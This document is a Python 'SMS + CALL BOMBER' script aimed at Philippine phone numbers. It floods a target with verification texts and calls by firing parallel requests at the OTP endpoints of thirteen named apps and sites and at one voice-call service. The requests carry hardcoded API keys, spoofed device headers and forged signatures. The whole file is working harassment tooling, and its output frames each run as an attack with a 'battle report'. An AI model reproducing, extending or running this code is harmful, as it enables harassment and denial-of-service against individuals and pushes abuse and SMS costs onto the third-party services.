#!/usr/bin/env python3
# SMS + CALL BOMBER
# MADE BY RUDO
# RAPID FIRE MODE - NO DELAY PARALLEL ATTACK

import json
import random
import time
import hashlib
import requests
import re
import sys
import os
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
W = "\033[97m"
M = "\033[95m"
BL = "\033[30m"
BOLD = "\033[1m"
DIM = "\033[2m"
BLINK = "\033[5m"
RESET = "\033[0m"
CLS = "\033[2J\033[H"

def clear():
    print(CLS, end="")

def banner():
    clear()
    print(f"""{R}{BOLD}{BLINK}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     ███████╗███╗   ███╗███████╗     ██████╗ █████╗ ██╗     ║
║     ██╔════╝████╗ ████║██╔════╝    ██╔════╝██╔══██╗██║     ║
║     ███████╗██╔████╔██║███████╗    ██║     ███████║██║     ║
║     ╚════██║██║╚██╔╝██║╚════██║    ██║     ██╔══██║██║     ║
║     ███████║██║ ╚═╝ ██║███████║    ╚██████╗██║  ██║███████╗║
║     ╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝║
║                                                              ║
║           SMS + CALL BOMBER v3.0 - RAPID FIRE               ║
║                    MADE BY RUDO                             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    print(f"{DIM}{'═'*60}{RESET}")

def format_phone(phone):
    clean = re.sub(r'\D', '', phone)
    if clean.startswith('63'):
        clean = clean[2:]
    if clean.startswith('0'):
        clean = clean[1:]
    return clean[:10]

def format_phone_display(phone):
    clean = format_phone(phone)
    return f"+63{clean}"

def random_string(length=10):
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(chars) for _ in range(length))

def random_email():
    return f"{random_string(10)}@gmail.com"

def random_md5():
    return ''.join(random.choice('abcdef0123456789') for _ in range(32))

def current_timestamp():
    return int(time.time())

def current_timestamp_ms():
    return int(time.time() * 1000)

# SMS SERVICES
def mwell_send(phone):
    try:
        formatted = format_phone(phone)
        timestamp = current_timestamp_ms()
        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
            'x-app-version': '03.942.035',
            'x-device-type': 'android',
            'x-device-model': 'oneplus CPH2465',
            'x-timestamp': str(timestamp),
            'x-request-id': random_string(16)
        }
        body = {'country': 'PH', 'phoneNumber': formatted, 'phoneNumberPrefix': '+63'}
        r = requests.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def pexx_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'appversion': '3.0.14',
            'x-msession-id': 'undefined',
            'tid': random_string(11)
        }
        body = {'0': {'json': {'email': '', 'areaCode': '+63', 'phone': f'+63{formatted}', 'otpChannel': 'TG', 'otpUsage': 'REGISTRATION'}}}
        r = requests.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def supportvip_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Accept-Encoding': 'gzip',
            'boat': 'com.peso.loan.vip.credit',
            'surface': '1.0.7',
            'suggestion': 'd284bf47c4c1e4da4e3e6375498c6245',
            'telescope': '',
            'Content-Type': 'application/json; charset=utf-8'
        }
        body = {'invasion': formatted, 'persist': 'login', 'threshold': False}
        r = requests.post('https://supportviploan.com/pomelo/abortion/suffering/test', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def ezloan_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {
            'User-Agent': 'okhttp/4.9.2',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'accept-language': 'en',
            'imei': random_string(32),
            'device': 'android',
            'appversion': '2.0.4',
            'appid': 'EZLOAN',
            'businessid': 'EZLOAN'
        }
        body = {'businessId': 'EZLOAN', 'contactNumber': f'+63{formatted}'}
        r = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def xpressph_send(phone):
    try:
        formatted = format_phone(phone)
        timestamp = current_timestamp()
        headers = {
            'User-Agent': 'Dalvik/2.1.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        body = {'FirstName': f'User{timestamp}', 'LastName': 'Test', 'Email': f'user{timestamp}@gmail.com', 'Phone': f'+63{formatted}'}
        r = requests.post('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def bistro_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'x-requested-with': 'com.allcardtech.bistro'
        }
        r = requests.get(f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted}', headers=headers, timeout=8)
        return r.status_code == 200
    except:
        return False

def bayadcenter_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        body = {'mobileNumber': f'+63{formatted}', 'emailAddress': random_email()}
        r = requests.post('https://api.online.bayad.com/api/sign-up/otp', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def supremeloan_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'bill': '',
            'syndrome': '1.1.3',
            'throughout': 'com.supreme.money.loan',
            'cute': 'd284bf47c4c1e4da4e3e6375498c6245',
            'cure': '14.864864864864865',
            'come': '121.05883328670785',
            'Content-Type': 'application/json; charset=utf-8'
        }
        body = {'aide': 'd284bf47c4c1e4da4e3e6375498c6245', 'exactly': formatted, 'sick': False}
        r = requests.post('https://suprememoneyloan.com/berry/oak/puzzle/wipe/blade', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def pickupcoffee_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        body = {'mobile_number': f'+63{formatted}', 'login_method': 'mobile_number'}
        r = requests.post('https://production.api.pickup-coffee.net/v2/customers/login', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def honeyloan_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        body = {'phone': formatted}
        r = requests.post('https://api.honeyloan.ph/api/client/registration/step-one', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def kumuph_send(phone):
    try:
        formatted = format_phone(phone)
        encrypt_timestamp = current_timestamp()
        encrypt_rnd_string = random_string(32)
        secret = "kumu_secret_2024"
        sign_data = f"{encrypt_timestamp}{encrypt_rnd_string}{formatted}{secret}"
        encrypt_signature = hashlib.sha256(sign_data.encode()).hexdigest()
        headers = {
            'User-Agent': 'okhttp/5.0.0-alpha.14',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'Device-Type': 'android',
            'Device-Id': random_string(16)
        }
        body = {
            'country_code': '+63',
            'encrypt_rnd_string': encrypt_rnd_string,
            'cellphone': formatted,
            'encrypt_signature': encrypt_signature,
            'encrypt_timestamp': encrypt_timestamp
        }
        r = requests.post('https://api.kumuapi.com/v2/user/sendverifysms', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def s5com_send(phone):
    try:
        formatted = f"+63{format_phone(phone)}"
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'
        }
        body = f'phone_number={formatted}'
        r = requests.post('https://api.s5.com/player/api/v1/otp/request', headers=headers, data=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def cashalo_send(phone):
    try:
        formatted = format_phone(phone)
        device_identifier = random_string(16)
        headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
            'x-device-identifier': device_identifier,
            'x-device-type': '1'
        }
        body = {'phone_number': formatted, 'device_identifier': device_identifier, 'device_type': 1}
        r = requests.post('https://api.cashaloapp.com/access/register', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

# VOICE SERVICE
def mocasa_voice_send(phone):
    try:
        formatted = format_phone(phone)
        if not formatted.startswith('9'):
            return False
        device_id = "0536db2db2b341e483de881c94e0e203"
        payload = json.dumps({
            "country": "Philippines",
            "appVersion": 206,
            "appPackageName": "com.mocasa.ph",
            "mobile": formatted,
            "channel": "APP",
            "systemType": 0,
            "myDeviceId": device_id,
            "appCode": "mocasa",
            "sendChannel": "voice",
            "verifyType": 1,
            "token": ""
        })
        headers = {
            'User-Agent': 'okhttp/4.8.0',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json'
        }
        r = requests.post('https://service.mocasa.com/app/v1/login/sendVerifyCode', headers=headers, data=payload, timeout=15)
        if r.status_code == 200:
            resp = r.json()
            return resp.get('code') == 0
        return False
    except:
        return False

SMS_SERVICES = [
    ("MWELL", mwell_send),
    ("PEXX", pexx_send),
    ("SUPPORT VIP", supportvip_send),
    ("EZLOAN", ezloan_send),
    ("XPRESS PH", xpressph_send),
    ("BISTRO", bistro_send),
    ("BAYAD CENTER", bayadcenter_send),
    ("SUPREME LOAN", supremeloan_send),
    ("PICKUP COFFEE", pickupcoffee_send),
    ("HONEY LOAN", honeyloan_send),
    ("KUMU PH", kumuph_send),
    ("S5.COM", s5com_send),
    ("CASHALO", cashalo_send),
]

VOICE_SERVICES = [
    ("MOCASA VOICE", mocasa_voice_send),
]

results_queue = queue.Queue()
stop_flag = threading.Event()

def worker_sms(name, func, phone, round_num):
    try:
        result = func(phone)
        results_queue.put(('sms', name, result, round_num))
        return result
    except:
        results_queue.put(('sms', name, False, round_num))
        return False

def worker_voice(name, func, phone, call_num):
    try:
        result = func(phone)
        results_queue.put(('voice', name, result, call_num))
        return result
    except:
        results_queue.put(('voice', name, False, call_num))
        return False

def rapid_fire_bomb(phone, rounds, voice_calls):
    sms_success = 0
    sms_total = 0
    voice_success = 0
    voice_total = 0
    active_threads = []
    
    print(f"\n{R}{BOLD}{BLINK}>>> RAPID FIRE DEPLOYED <<<{RESET}\n")
    print(f"{DIM}{'─'*60}{RESET}")
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        
        for round_num in range(1, rounds + 1):
            for name, func in SMS_SERVICES:
                sms_total += 1
                future = executor.submit(worker_sms, name, func, phone, round_num)
                futures.append(future)
        
        for call_num in range(1, voice_calls + 1):
            for name, func in VOICE_SERVICES:
                voice_total += 1
                future = executor.submit(worker_voice, name, func, phone, call_num)
                futures.append(future)
        
        completed = 0
        total = len(futures)
        
        while completed < total:
            try:
                service_type, name, result, identifier = results_queue.get(timeout=1)
                completed += 1
                
                if service_type == 'sms':
                    if result:
                        sms_success += 1
                        print(f"  {G}[SMS]{RESET} {name:<15} [{identifier}] {DIM}OK{RESET}")
                    else:
                        print(f"  {R}[SMS]{RESET} {name:<15} [{identifier}] {DIM}FAIL{RESET}")
                else:
                    if result:
                        voice_success += 1
                        print(f"  {C}[CALL]{RESET} {name:<13} [{identifier}] {DIM}RING{RESET}")
                    else:
                        print(f"  {R}[CALL]{RESET} {name:<13} [{identifier}] {DIM}FAIL{RESET}")
                
                perc = (completed * 100) // total
                print(f"  {DIM}[{perc}%] {completed}/{total} completed{RESET}\r", end="", flush=True)
                
            except:
                continue
    
    elapsed = time.time() - start_time
    
    print(f"\n{DIM}{'─'*60}{RESET}")
    
    return sms_success, sms_total, voice_success, voice_total, elapsed

def main():
    banner()
    
    print(f"{R}{BOLD}{BLINK}⚠  WARNING: RAPID FIRE MODE  ⚠{RESET}")
    print(f"{DIM}All services attack simultaneously - NO DELAY{RESET}\n")
    
    while True:
        print(f"{C}{BOLD}[ TARGET ]{RESET}")
        print(f"  {DIM}Format: 09XXXXXXXXX or 9XXXXXXXXX{RESET}")
        phone = input(f"\n{BOLD}PHONE >{RESET} ").strip()
        
        valid = format_phone(phone)
        if len(valid) != 10 or not valid.startswith('9'):
            print(f"\n{R}[ERROR] Invalid Philippine number{RESET}")
            continue
        
        print(f"\n{G}[TARGET]{RESET} {format_phone_display(valid)}")
        print(f"{C}[SMS]{RESET} {len(SMS_SERVICES)} services")
        print(f"{C}[CALL]{RESET} {len(VOICE_SERVICES)} voice service")
        
        print(f"\n{Y}{BOLD}[ CONFIG ]{RESET}")
        rnd = input(f"{BOLD}SMS ROUNDS{RESET} [1-10] > ").strip()
        try:
            rounds = int(rnd) if rnd else 3
            rounds = max(1, min(10, rounds))
        except:
            rounds = 3
        
        vc = input(f"{BOLD}VOICE CALLS{RESET} [1-10] > ").strip()
        try:
            voice_calls = int(vc) if vc else 3
            voice_calls = max(1, min(10, voice_calls))
        except:
            voice_calls = 3
        
        print(f"\n{R}{BOLD}{BLINK}")
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                 RAPID FIRE ENGAGED                          ║")
        print("║     ALL SYSTEMS FIRING SIMULTANEOUSLY - NO DELAY            ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print(f"{RESET}")
        
        confirm = input(f"{R}{BOLD}DEPLOY? [y/N] >{RESET} ").strip().lower()
        if confirm != 'y':
            continue
        
        sms_ok, sms_total, voice_ok, voice_total, elapsed = rapid_fire_bomb(valid, rounds, voice_calls)
        
        print(f"\n{G}{BOLD}╔══════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{G}{BOLD}║                    BATTLE REPORT                            ║{RESET}")
        print(f"{G}{BOLD}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{G}{BOLD}║{RESET}  {C}TARGET{RESET}   {format_phone_display(valid)}{' ' * (44 - len(format_phone_display(valid)))}{G}{BOLD}║{RESET}")
        print(f"{G}{BOLD}║{RESET}  {C}TIME{RESET}    {elapsed:.2f} seconds{' ' * (47)}{G}{BOLD}║{RESET}")
        print(f"{G}{BOLD}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{G}{BOLD}║{RESET}  {G}SMS OK{RESET}   {sms_ok}/{sms_total} ({sms_ok*100//sms_total if sms_total > 0 else 0}%){' ' * (36)}{G}{BOLD}║{RESET}")
        print(f"{G}{BOLD}║{RESET}  {R}SMS FAIL{RESET} {sms_total - sms_ok}/{sms_total}{' ' * (40)}{G}{BOLD}║{RESET}")
        print(f"{G}{BOLD}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{G}{BOLD}║{RESET}  {C}CALL OK{RESET}  {voice_ok}/{voice_total} ({voice_ok*100//voice_total if voice_total > 0 else 0}%){' ' * (36)}{G}{BOLD}║{RESET}")
        print(f"{G}{BOLD}║{RESET}  {R}CALL FAIL{RESET}{voice_total - voice_ok}/{voice_total}{' ' * (40)}{G}{BOLD}║{RESET}")
        print(f"{G}{BOLD}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{G}{BOLD}║{RESET}  {Y}TOTAL{RESET}    {sms_ok + voice_ok}/{sms_total + voice_total}{' ' * (37)}{G}{BOLD}║{RESET}")
        print(f"{G}{BOLD}╚══════════════════════════════════════════════════════════════╝{RESET}")
        
        print(f"\n{DIM}[RAPID FIRE COMPLETE] Press ENTER to continue{RESET}")
        input()
        
        print(f"\n{Y}[?] Attack another target? [y/N]{RESET}")
        again = input().strip().lower()
        if again != 'y':
            print(f"\n{G}[EXIT] Goodbye.{RESET}")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Y}[STOP] Interrupted by user{RESET}")
        print(f"{C}[EXIT] Goodbye.{RESET}\n")
    except Exception as e:
        print(f"\n{R}[FATAL] {str(e)}{RESET}")